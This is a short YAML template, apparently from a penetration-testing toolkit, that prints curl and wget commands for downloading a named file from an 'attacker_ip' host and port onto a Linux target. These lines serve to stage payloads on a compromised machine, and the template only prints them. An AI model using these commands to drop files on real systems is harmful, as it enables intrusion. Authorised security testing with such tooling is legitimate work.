---
metadata:
  filename: "download-linux.yaml"
  tags: ["utils", "linux", "web"]
  created: "2026-11-25"
  authors: ["TIVKU"]

content: |
  {% if filename -%}
  {% set label = filename if (dest is not defined or not dest or dest == filename) else filename ~ ' -> ' ~ dest -%}
  printf '%s\n' '================================================================'; \
  printf '%s\n' 'Deliver: {{ label }}'; \
  {% endif -%}
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                       -----Linux------                         '; \
  printf '%s\n' 'Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/{{ filename }} -o {{ delivery_path_linux }}/{{ dest | default(filename, true) }}'; \
  printf '%s\n' 'Deliver: wget http://{{ attacker_ip }}:{{ delivery_outbound_port }}/{{ filename }} -O {{ delivery_path_linux }}/{{ dest | default(filename, true) }}'; \
  printf '%s\n' '================================================================';
